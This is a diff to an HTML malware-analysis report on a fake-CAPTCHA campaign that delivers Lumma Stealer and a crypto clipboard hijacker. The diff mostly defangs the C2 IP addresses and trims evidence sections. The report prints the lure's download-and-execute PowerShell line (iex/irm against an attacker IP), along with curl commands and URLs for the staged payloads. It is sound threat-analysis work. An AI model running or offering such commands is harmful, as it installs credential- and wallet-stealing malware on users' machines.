@@ -164,9 +164,10 @@
         
         .evidence-caption {
             padding: 12px 15px;
-            font-size: 0.85em;
-            color: var(--text-muted);
+            font-size: 0.9em;
+            color: #c0c0c0;
             border-top: 1px solid var(--border);
+            font-weight: 500;
         }
         
         .code-block {
@@ -561,7 +562,7 @@
                     </p>
                     <ul style="margin: 15px 0 15px 30px; line-height: 2;">
                         <li><strong>Lumma Stealer</strong> (cs.bin) — A native C/C++ info stealer targeting browsers, crypto wallets, and messaging apps</li>
-                        <li><strong>Cryptocurrency Clipboard Hijacker</strong> (clipx64.bin) — A Marte-family clipper with 17 hardcoded attacker wallets</li>
+                        <li><strong>Cryptocurrency Clipboard Hijacker</strong> (clipx64.bin) — A crypto clipper with 17 hardcoded attacker wallets</li>
                     </ul>
                     <p>
                         Reverse engineering using Ghidra revealed the clipboard hijacker contains code to <strong>exclude Russian victims</strong> 
@@ -621,7 +622,7 @@
                 <h3 style="margin-top: 20px; color: var(--accent);">The Malicious Command</h3>
                 <div class="code-block">
                     <div class="code-header">PowerShell Command (Copied to Clipboard via JavaScript)</div>
-                    <div class="code-content">powershell -c iex(irm 158.94.209.33 -UseBasicParsing)</div>
+                    <div class="code-content">powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)</div>
                 </div>
                 
                 <div class="table-wrapper"><table>
@@ -641,7 +642,7 @@
                         <td>Download from URL</td>
                     </tr>
                     <tr>
-                        <td><code>158.94.209.33</code></td>
+                        <td><code>158[.]94[.]209[.]33</code></td>
                         <td>Attacker's C2 server</td>
                         <td>Payload source</td>
                     </tr>
@@ -669,7 +670,7 @@
                 <h3 style="color: var(--accent);">Stage 1: Dropper Script</h3>
                 <div class="code-block">
                     <div class="code-header">Command Used to Download Stage 1</div>
-                    <div class="code-content">curl http://158.94.209.33 -o stage1_payload.txt</div>
+                    <div class="code-content">curl http://158[.]94[.]209[.]33 -o stage1_payload.txt</div>
                 </div>
                 
                 <div class="evidence-box">
@@ -677,7 +678,7 @@
                     <img src="03-stage1-dropper-payload.png" alt="Stage 1 Payload">
                     <div class="evidence-caption">
                         Stage 1 dropper script showing social engineering message "Wait please, don't close this window..." 
-                        and hidden PowerShell process launch to download Stage 2 from 178.16.53.70.
+                        and hidden PowerShell process launch to download Stage 2 from 178[.]16[.]53[.]70.
                     </div>
                 </div>
 
@@ -693,7 +694,7 @@
                 <h3 style="color: var(--accent); margin-top: 25px;">Stage 2: Shellcode Loader</h3>
                 <div class="code-block">
                     <div class="code-header">Command Used to Download Stage 2</div>
-                    <div class="code-content">curl http://178.16.53.70 -o stage2_payload.txt</div>
+                    <div class="code-content">curl http://178[.]16[.]53[.]70 -o stage2_payload.txt</div>
                 </div>
                 
                 <div class="evidence-box">
@@ -819,7 +820,7 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
 
                 <div class="evidence-box">
                     <div class="evidence-header">Evidence: Process Tree - Full Attack Flow</div>
-                    <img src="19-process-tree-attack-flow.png" alt="Process Tree">
+                    <img src="19-process-tree-attack-flow.png" alt="Process Tree" style="transform: scale(1.2); transform-origin: top left; margin-bottom: 40px;">
                     <div class="evidence-caption">
                         Process tree showing the complete execution flow: PowerShell spawning child processes 
                         for shellcode execution and payload delivery.
@@ -853,14 +854,6 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
                     </div>
                 </div>
 
-                <div class="evidence-box">
-                    <div class="evidence-header">Evidence: Network Activity Flow</div>
-                    <img src="17-network-activity-flow.png" alt="Network Flow">
-                    <div class="evidence-caption">
-                        Chronological network activity showing connections to multiple C2 servers during execution.
-                    </div>
-                </div>
-                
                 <div class="highlight-box warning">
                     <h3>Modular C2 Infrastructure</h3>
                     <p>
@@ -988,15 +981,6 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
                     </div>
                 </div>
 
-                <div class="evidence-box">
-                    <div class="evidence-header">Evidence: Malicious Bridge DLL Detection</div>
-                    <img src="23-procmon-malicious-dll-detected.png" alt="Dropped DLL">
-                    <div class="evidence-caption">
-                        The temporary DLL file (containing VirtualAlloc/CreateThread API declarations) 
-                        is detected as malicious. This DLL acts as a bridge to enable shellcode execution.
-                    </div>
-                </div>
-                
                 <h3 style="color: var(--accent); margin-top: 20px;">How It Works</h3>
                 <div class="table-wrapper"><table>
                     <tr>
@@ -1058,7 +1042,7 @@ SHA256          35EC1234DA4E6433A797E5BA719E3A6B2CB455A8C3815601074B3FEF7BBC9B39
             <div class="section-content">
                 <p>
                     During live execution, the C2 server delivered <code>clipx64.bin</code> — a <strong>cryptocurrency 
-                    clipboard hijacker</strong> (Marte family). This malware monitors the Windows clipboard for 
+                    clipboard hijacker</strong>. This malware monitors the Windows clipboard for 
                     cryptocurrency wallet addresses and silently replaces them with attacker-controlled addresses.
                 </p>
                 
@@ -1091,15 +1075,6 @@ $result = Get-Clipboard
 # Result: Address was REPLACED with attacker's wallet!
 # Original: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (Satoshi's address)
 # Hijacked: 113AiBfBwD16qFmPTRW54ATKyu6fcC7w3i (Attacker's wallet)</div>
-                </div>
-
-                <div class="evidence-box">
-                    <div class="evidence-header critical">Evidence: LIVE Clipboard Hijacking Captured!</div>
-                    <img src="25-clipboard-hijack-live-test.png" alt="Live Hijack Evidence">
-                    <div class="evidence-caption">
-                        <strong>Smoking Gun:</strong> PowerShell test proving the clipboard hijacker is active. 
-                        The victim's Bitcoin address was replaced with the attacker's wallet in real-time.
-                    </div>
                 </div>
 
                 <div class="evidence-box">
@@ -1216,35 +1191,7 @@ $result = Get-Clipboard
                     </div>
                 </div>
 
-                <h3 style="color: var(--accent); margin-top: 25px;">Anti-Analysis Features</h3>
-                <div class="table-wrapper"><table>
-                    <tr>
-                        <th>Feature</th>
-                        <th>API/Value</th>
-                        <th>Purpose</th>
-                    </tr>
-                    <tr>
-                        <td>Debugger Detection</td>
-                        <td><code>IsDebuggerPresent</code></td>
-                        <td>Detect local debugging</td>
-                    </tr>
-                    <tr>
-                        <td>Remote Debugger Check</td>
-                        <td><code>CheckRemoteDebuggerPresent</code></td>
-                        <td>Detect remote analysis</td>
-                    </tr>
-                    <tr>
-                        <td>Single Instance</td>
-                        <td><code>CryptoClipboardMonitorMutex</code></td>
-                        <td>Prevent multiple executions</td>
-                    </tr>
-                    <tr>
-                        <td>Regional Check</td>
-                        <td><code>GetKeyboardLayout() == 0x419</code></td>
-                        <td><span class="tag tag-russian">Exclude Russian victims</span></td>
-                    </tr>
-                </table></div>
-            </div>
+                </div>
         </section>
 
         <!-- Section 8: Ghidra Reverse Engineering -->
@@ -1370,7 +1317,7 @@ undefined8 FUN_14000177e(char *param_1) {  // param_1 = attacker's wallet addres
                         <div class="stage-num">1</div>
                         <div class="stage-info">
                             <h4>DROPPER</h4>
-                            <p><span class="ioc-value">158.94.209.33</span> — Displays "Wait please...", launches hidden PowerShell</p>
+                            <p><span class="ioc-value">158[.]94[.]209[.]33</span> — Displays "Wait please...", launches hidden PowerShell</p>
                         </div>
                     </div>
                     <div class="stage-arrow">↓</div>
@@ -1378,7 +1325,7 @@ undefined8 FUN_14000177e(char *param_1) {  // param_1 = attacker's wallet addres
                         <div class="stage-num">2</div>
                         <div class="stage-info">
                             <h4>SHELLCODE LOADER</h4>
-                            <p><span class="ioc-value">178.16.53.70</span> — Downloads shellcode, uses VirtualAlloc + CreateThread via .NET bridge</p>
+                            <p><span class="ioc-value">178[.]16[.]53[.]70</span> — Downloads shellcode, uses VirtualAlloc + CreateThread via .NET bridge</p>
                         </div>
                     </div>
                     <div class="stage-arrow">↓</div>
@@ -1409,19 +1356,10 @@ undefined8 FUN_14000177e(char *param_1) {  // param_1 = attacker's wallet addres
                         <div class="chain-stage alt">
                             <div class="stage-num">5B</div>
                             <div class="stage-info">
-                                <h4>CRYPTO CLIPPER (Marte)</h4>
+                                <h4>CRYPTO CLIPPER</h4>
                                 <p><span class="ioc-value">clipx64.bin</span> — 17 wallets, Russian exclusion</p>
                             </div>
                         </div>
-                    </div>
-                </div>
-
-                <div class="evidence-box">
-                    <div class="evidence-header">Evidence: Procmon - Complete Process Tree</div>
-                    <img src="20-procmon-process-tree.png" alt="Procmon Tree">
-                    <div class="evidence-caption">
-                        Process Monitor process tree showing the complete attack execution flow from initial 
-                        PowerShell to shellcode execution.
                     </div>
                 </div>
             </div>
@@ -1442,9 +1380,9 @@ undefined8 FUN_14000177e(char *param_1) {  // param_1 = attacker's wallet addres
                 <div class="code-block">
                     <div class="code-header">C2 Server Connectivity Test</div>
                     <div class="code-content">$urls = @(
-    "http://158.94.209.33",
-    "http://178.16.53.70",
-    "http://94.154.35.115/user_profiles_photo/cptch.bin"
+    "http://158[.]94[.]209[.]33",
+    "http://178[.]16[.]53[.]70",
+    "http://94[.]154[.]35[.]115/user_profiles_photo/cptch.bin"
 )
 
 foreach ($url in $urls) {
@@ -1481,17 +1419,17 @@ foreach ($url in $urls) {
                             <th>Role</th>
                         </tr>
                         <tr>
-                            <td><span class="ioc-value">158.94.209.33</span></td>
+                            <td><span class="ioc-value">158[.]94[.]209[.]33</span></td>
                             <td><span class="tag tag-danger">LIVE</span></td>
                             <td>Stage 1 Dropper</td>
                         </tr>
                         <tr>
-                            <td><span class="ioc-value">178.16.53.70</span></td>
+                            <td><span class="ioc-value">178[.]16[.]53[.]70</span></td>
                             <td><span class="tag tag-danger">LIVE</span></td>
                             <td>Stage 2 Loader</td>
                         </tr>
                         <tr>
-                            <td><span class="ioc-value">94.154.35.115</span></td>
+                            <td><span class="ioc-value">94[.]154[.]35[.]115</span></td>
                             <td><span class="tag tag-danger">LIVE</span></td>
                             <td>Payload Server</td>
                         </tr>
@@ -1517,37 +1455,37 @@ foreach ($url in $urls) {
                     </tr>
                     <tr>
                         <td>1</td>
-                        <td><span class="ioc-value">158.94.209.33</span></td>
+                        <td><span class="ioc-value">158[.]94[.]209[.]33</span></td>
                         <td>/</td>
                         <td>Initial dropper</td>
                     </tr>
                     <tr>
                         <td>2</td>
-                        <td><span class="ioc-value">178.16.53.70</span></td>
+                        <td><span class="ioc-value">178[.]16[.]53[.]70</span></td>
                         <td>/</td>
                         <td>Shellcode loader</td>
                     </tr>
                     <tr>
                         <td>3</td>
-                        <td><span class="ioc-value">94.154.35.115</span></td>
+                        <td><span class="ioc-value">94[.]154[.]35[.]115</span></td>
                         <td>/user_profiles_photo/cptch.bin</td>
                         <td>Donut shellcode</td>
                     </tr>
                     <tr>
                         <td>4</td>
-                        <td><span class="ioc-value">94.154.35.115</span></td>
+                        <td><span class="ioc-value">94[.]154[.]35[.]115</span></td>
                         <td>/user_profiles_photo/cptchbuild.bin</td>
                         <td>Stealer loader</td>
                     </tr>
                     <tr>
                         <td>5A</td>
-                        <td><span class="ioc-value">94.154.35.115</span></td>
+                        <td><span class="ioc-value">94[.]154[.]35[.]115</span></td>
                         <td>/user_profiles_photo/cs.bin</td>
                         <td>Lumma Stealer</td>
                     </tr>
                     <tr>
                         <td>5B</td>
-                        <td><span class="ioc-value">94.154.35.115</span></td>
+                        <td><span class="ioc-value">94[.]154[.]35[.]115</span></td>
                         <td>/user_profiles_photo/clipx64.bin</td>
                         <td>Crypto Clipper</td>
                     </tr>
@@ -1720,11 +1658,11 @@ foreach ($url in $urls) {
             <div class="section-content">
                 <h3 style="color: var(--accent);">Key Findings</h3>
                 <ul style="margin-left: 20px; line-height: 2;">
-                    <li>Active campaign targeting <strong>charity/volunteer organization payment pages</strong></li>
+                    <li>Active campaign targeting <strong>payment pages</strong></li>
                     <li>Uses <strong>fake CAPTCHA</strong> with Cloudflare branding for social engineering</li>
                     <li>Sophisticated <strong>5-stage fileless attack</strong> using Donut shellcode</li>
                     <li><strong>Modular payload system</strong> — C2 dynamically serves different malware</li>
-                    <li>Two confirmed payloads: <strong>Lumma Info Stealer</strong> and <strong>Marte Crypto Clipper</strong></li>
+                    <li>Two confirmed payloads: <strong>Lumma Info Stealer</strong> and <strong>Crypto Clipboard Hijacker</strong></li>
                     <li>Clipper contains <strong>17 hardcoded attacker wallets</strong> for cryptocurrency theft</li>
                     <li><strong>Russian origin confirmed</strong> — malware excludes systems with Russian keyboard (0x419)</li>
                     <li>Uses <strong>.NET compilation bridge</strong> (Add-Type) for fileless API access</li>
@@ -1737,7 +1675,7 @@ foreach ($url in $urls) {
                         <th>Priority</th>
                     </tr>
                     <tr>
-                        <td>Block C2 IPs: 158.94.209.33, 178.16.53.70, 94.154.35.115</td>
+                        <td>Block C2 IPs: 158[.]94[.]209[.]33, 178[.]16[.]53[.]70, 94[.]154[.]35[.]115</td>
                         <td><span class="tag tag-danger">CRITICAL</span></td>
                     </tr>
                     <tr>
@@ -1755,10 +1693,6 @@ foreach ($url in $urls) {
                     <tr>
                         <td>Notify affected organization about website compromise</td>
                         <td><span class="tag tag-danger">HIGH</span></td>
-                    </tr>
-                    <tr>
-                        <td>Implement CSP headers to prevent script injection</td>
-                        <td><span class="tag tag-warning">MEDIUM</span></td>
                     </tr>
                     <tr>
                         <td>Educate users: legitimate CAPTCHAs never require running commands</td>
